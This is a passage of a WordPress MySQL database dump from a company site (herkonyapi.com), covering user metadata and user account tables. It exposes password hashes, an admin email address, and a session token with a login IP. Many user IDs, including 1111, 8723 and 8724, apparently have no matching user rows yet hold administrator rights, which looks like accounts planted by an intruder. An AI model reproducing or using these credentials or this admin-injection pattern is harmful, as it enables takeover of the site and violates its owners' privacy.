INSERT INTO `cmrfu_usermeta` VALUES("44","1111","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("45","1111","cmrfu_capabilities","a:1:{s:13:\"administrator\";s:1:\"1\";}");
INSERT INTO `cmrfu_usermeta` VALUES("46","1111","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("47","1111","_yoast_wpseo_profile_updated","1426893202");
INSERT INTO `cmrfu_usermeta` VALUES("48","2","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("49","2","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("50","2","_yoast_wpseo_profile_updated","1427868776");
INSERT INTO `cmrfu_usermeta` VALUES("51","3","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("52","3","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("53","4","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("54","4","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("55","4","_yoast_wpseo_profile_updated","1428712080");
INSERT INTO `cmrfu_usermeta` VALUES("56","3","_yoast_wpseo_profile_updated","1428712080");
INSERT INTO `cmrfu_usermeta` VALUES("57","5","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("58","5","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("59","5","_yoast_wpseo_profile_updated","1442826968");
INSERT INTO `cmrfu_usermeta` VALUES("60","6","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("61","6","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("62","6","_yoast_wpseo_profile_updated","1443580500");
INSERT INTO `cmrfu_usermeta` VALUES("63","8723","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("64","8724","cmrfu_capabilities","a:1:{s:13:\"administrator\";s:1:\"1\";}");
INSERT INTO `cmrfu_usermeta` VALUES("65","8724","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("78","1","session_tokens","a:1:{s:64:\"e79d0e4fb502e9c989fa0453e2f0acc1307a50df14fe1c4ffeb16c1dc5e09c99\";a:4:{s:10:\"expiration\";i:1490348887;s:2:\"ip\";s:12:\"91.239.81.62\";s:2:\"ua\";s:136:\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 FirePHP/4Chrome\";s:5:\"login\";i:1490176087;}}");
INSERT INTO `cmrfu_usermeta` VALUES("69","1","cmrfu_yoast_notifications","a:2:{i:0;a:2:{s:7:\"message\";s:727:\"We\'ve noticed you\'ve been using Yoast SEO for some time now; we hope you love it! We\'d be thrilled if you could <a href=\"https://yoa.st/rate-yoast-seo\">give us a 5 stars rating on WordPress.org</a>!

If you are experiencing issues, <a href=\"https://yoa.st/bugreport\">please file a bug report</a> and we\'ll do our best to help you out.

By the way, did you know we also have a <a href=\'https://yoa.st/premium-notification\'>Premium plugin</a>? It offers advanced features, like a redirect manager and support for multiple keywords. It also comes with 24/7 personal support.

<a class=\"button\" href=\"https://www.herkonyapi.com/wp-admin/?page=wpseo_dashboard&yoast_dismiss=upsell\">Please don\'t show me this notification anymore</a>\";s:7:\"options\";a:8:{s:4:\"type\";s:7:\"warning\";s:2:\"id\";s:19:\"wpseo-upsell-notice\";s:5:\"nonce\";N;s:8:\"priority\";d:0.80000000000000004;s:9:\"data_json\";a:0:{}s:13:\"dismissal_key\";N;s:12:\"capabilities\";s:14:\"manage_options\";s:16:\"capability_check\";s:3:\"all\";}}i:1;a:2:{s:7:\"message\";s:169:\"Don\'t miss your crawl errors: <a href=\"https://www.herkonyapi.com/wp-admin/admin.php?page=wpseo_search_console&tab=settings\">connect with Google Search Console here</a>.\";s:7:\"options\";a:8:{s:4:\"type\";s:7:\"warning\";s:2:\"id\";s:17:\"wpseo-dismiss-gsc\";s:5:\"nonce\";N;s:8:\"priority\";d:0.5;s:9:\"data_json\";a:0:{}s:13:\"dismissal_key\";N;s:12:\"capabilities\";s:14:\"manage_options\";s:16:\"capability_check\";s:3:\"all\";}}}");
INSERT INTO `cmrfu_usermeta` VALUES("76","1","wpseo_keyword_analysis_disable","");
INSERT INTO `cmrfu_usermeta` VALUES("77","1","locale","");
INSERT INTO `cmrfu_usermeta` VALUES("70","1","last_login_time","2017-03-22 11:48:07");
INSERT INTO `cmrfu_usermeta` VALUES("71","1","wpseo_title","");
INSERT INTO `cmrfu_usermeta` VALUES("72","1","wpseo_metadesc","");
INSERT INTO `cmrfu_usermeta` VALUES("73","1","wpseo_metakey","");
INSERT INTO `cmrfu_usermeta` VALUES("74","1","wpseo_excludeauthorsitemap","");
INSERT INTO `cmrfu_usermeta` VALUES("75","1","wpseo_content_analysis_disable","");


DROP TABLE IF EXISTS `cmrfu_users`;

CREATE TABLE `cmrfu_users` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_login` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_pass` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_nicename` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_url` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `user_activation_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_status` int(11) NOT NULL DEFAULT '0',
  `display_name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`),
  KEY `user_login_key` (`user_login`),
  KEY `user_nicename` (`user_nicename`),
  KEY `user_email` (`user_email`)
) ENGINE=MyISAM AUTO_INCREMENT=8725 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_users` VALUES("1","herkon123","$P$B.giB2/8xhpciygXOVo3rMvtiAXEnq0","herkon123","info@herkonyapi.com","","2014-02-17 11:08:26","","0","herkon yapı");
INSERT INTO `cmrfu_users` VALUES("5","demouser","$P$B6Q0AcHkD41UkFs0BLkRrnNx4bJYs10","demouser","demouser@gmail.com","","2014-02-17 11:08:26","","0","demouser");


